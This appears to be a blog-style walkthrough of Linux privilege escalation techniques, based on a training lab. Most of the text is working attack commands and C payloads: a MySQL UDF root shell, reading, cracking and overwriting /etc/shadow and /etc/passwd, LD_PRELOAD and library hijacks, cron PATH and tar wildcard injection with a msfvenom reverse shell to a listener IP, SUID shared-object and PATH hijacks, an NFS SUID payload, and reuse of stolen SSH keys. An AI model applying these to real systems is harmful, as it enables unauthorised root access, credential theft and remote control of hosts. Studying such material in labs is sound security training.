# Linux Privilege Escalation Guide

Lets talk about the ways to linux privilege escalate from non-user by exploit executables.

<!--more-->

Links:
https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd
https://github.com/sagishahar/lpeworkshop


## 1. Service Exploits
### mysql 
Using the exploit from exploit db to get the rootshell. Since mysql is run by root without password where we can create the tables and run the `command` using function.
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:
```bash
root@gr4n173:~$ cd /home/user/tools/mysql-udf
```

Compile the `raptor_udf2.c` exploit code using the following commands:
```bash
root@gr4n173:~$ gcc -g -c raptor_udf2.c -fPIC
root@gr4n173:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```


Connect to the MySQL service as the root user with a blank password:
```bash
root@gr4n173:~$ mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) `"do_system"` using our compiled exploit:
```bash
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
```


Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit out of the MySQL shell (type `exit` or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```bash
root@gr4n173:~$ /tmp/rootbash -p
```


## 2. Week file permission 
### Readable
#/etc/shadow 
Here I will be exploiting the shadow file which have read permission.
At first I have check the permission of `shadow` file.
```bash
root@gr4n173:~$ ls -al /etc/shadow
-rw-r--rw- 1 root shadow 845 May  2 03:41 /etc/shadow
```


There you can see the `rw` permission to others. So I have read the shadow file and collected the hash of root user.
```bash
root@gr4n173:~$ cat /etc/shadow          
root:Hashesh over here :0:99999:7:::                                     
daemon:*:17298:0:99999:7:::                                                     
bin:*:17298:0:99999:7::: 
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::  
```


Now after collecting `hash` I have used `john` to crack the hash using `rockyou` password wordlist.
```bash
root@gr4n173:~$ john --wordlists=/usr/share/rockyou.txt hash
```


### Writable
# /etc/shadow
For the week file permission I have created the new hash of newpassword using `mkpasswd` tool in kali linux.

```zsh
root@gr4n173:~$ mkpasswd -m sha-512 passwordhere
$6$gdvluNMatnPMjy7r$1oYL8zHY7vcNAQM1QLtoVN8V6cwKIbmXuWoft3fjwS4hPy.ZOOENIs66T6M7IitJeH9U6x3MKi8lJJp7FDifI.
 ```
 
 
 Now generated password can be replaced with the hash of `root` user and then we can login using the same password as a root.
 
 ### Writable 
 #/etc/passwd
 For this we can create the new hash of newpassword using `openssl` tool 
 ```bash
 root@gr4n173:~$ openssl passwd newpassword
 Warning: truncating password to 8 characters 
xuMbZmFpJEH/s                                
```


Then pasting this hash in `/etc/passwd` file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

## 3. Shell Escape Sequences
#Sudo
Basically we encounter many program which is run by root user so for that we can use the [GTFOBins](https://gtfobins.github.io/). 

Using instructions in GTFOBins we can get the root shell. From here I got the list of program which can be used the shell escape sequences but `apache2` can't be shell escape so for that we can use the environment variable things.


## 4. Sudo Environment Variables

```C
$code for preload environment
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```


Sudo can be configured to inherit certain environment variables from the user's environment.
Check which environment variables are inherited (look for the env\_keep options): `sudo -l`
`LD\_PRELOAD and LD\_LIBRARY\_PATH` are both inherited from the user's environment. `LD\_PRELOAD` loads a shared object before any others when a program is run. `LD\_LIBRARY\_PATH` provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:
```bash
root@gr4n173:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Run one of the programs you are allowed to run via sudo (listed when running **sudo -l**), while setting the LD\_PRELOAD environment variable to the full path of the new shared object:

```bash
root@gr4n173:~$ sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run `ldd` against the apache2 program file to see which shared libraries are used by the program:

```bash
root@gr4n173:~$ ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
```C
$Code for library path
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
root@gr4n173:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD\_LIBRARY\_PATH environment variable to /tmp (where we output the compiled shared object):

```bash
root@gr4n173:~$ sudo LD_LIBRARY_PATH=/tmp apache2
```

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again.

## 5. Cron Jobs
### Environment Variable

view the contents of the system-wide crontab: `cat /etc/crontab`

Note: the PATH variable starts with `/home/users` which is our user's home directory
```bash
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```


Now giving the permission to `overwrite.sh` file as `+x` so that crontab run everytime.

### Wildcards
If any command is run with a wildcard(\*) in home directory then we can use wildcard bypass technique in cron job. For that we have to generate the reverse_shell and then used shell to break out from restricted environments by spawing an interactive system shell.
`generate the shell`

```bash
root@gr4n173:~$ msfvenom -p linux/x64/reverse_tcp LHOST=10.10.14.175 -f elf -o shell.elf
```


Now we have to copy this file to the remote/vulnerable machine that can be done using `scp`.

```bash 
root@gr4n173:~$ scp /home/localuser/filename remoteuser@ipaddress:/home/user/
```


After shell.elf is downloaded to vulnerable box then set the permission over there.
```bash
root@gr4n173:~$ chmod +x /home/user/shell.elf
```

Create these two files in /home/user:

```bash 
root@gr4n173:~$ touch /home/user/--checkpoint=1  
root@gr4n173:~$ touch /home/user/--checkpoint-action=exec=shell.elf
```


When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Now final part is to set the listner in local machine then you can get the shell after certain minute.

## 5. SUID/SGID Executables
### Known Exploits
Inorder to find all the SUID/SGID executables on debian we can run 
```bash
root@gr4n173:~$ find / -perm -u=s -type f 2> /dev/null
```


Then after this we can search the exploit related to the version of executables then get the root shell.

### Shared Object Injection

```c
$ shared object injection C code
libcalc.c 
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
At first we have to identify the executables and vulnerable to `shared object injection`. For this we use the same technique with `find` and the strace the `so`
file
```bash
root@gr4n173:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```


Now, after running this we can see that shared object is loaded in our home directory but can't be found. So we can create that executables and the spawn a bash shell.
```bash
root@gr4n173:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```


Finally running the executables again we spawn the root shell.

### Environment Variables
Here we exploit the executables due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

Lets take an example if `service` executable is being called to start the webserver, however full path isn't used then we can use the executable called service and spawn the Bash shell.
```bash
root@gr4n173:~$ gcc -o service /home/user/file/service.c
```

```c
$ Service code
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

`PATH=.:$PATH /usr/local/bin/suid-env`

## 6. NFS
Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

```bash
root@gr4n173:~$ cat /etc/exports
```

Note that the **/tmp** share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

```bash
root@gr4n173:~$ sudo su
```

Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share (update the IP accordingly):

```bash
root@gr4n173:~$ mkdir /tmp/nfs  
root@gr4n173:~$ mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```

Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):

```bash
root@gr4n173:~$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```


Still using Kali's root user, make the file executable and set the SUID permission:

```bash
root@gr4n173:~$ chmod +xs /tmp/nfs/shell.elf
```

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

```bash
root@gr4n173:~$ /tmp/shell.elf
```

## 7. Password&Keys
### config Files
Sometimes the creator leave the credentials and keys inside the files so we have to check everypart of the directory.

### History Files
Sometimes password may be typed in their command line by users.
```bash
root@gr4n173:~$ cat ~/.*history.txt | less
```

### SSH Keys
Sometimes user makes the backups of important files but fail to secure them with correct permissions. So looking for hidden files & directories in the system root.

```bash
root@gr4n173:~$ ls -al /
```

From there we found the `ssh_key` which can be used to ssh into root 
```bash
root@gr4n173:~$ chmod 600 ssh_key_of_root
```

Ssh command to sshing into root.
```bash
root@gr4n173:~$ ssh -i ssh_key_of_root root@10.10.13.123
```


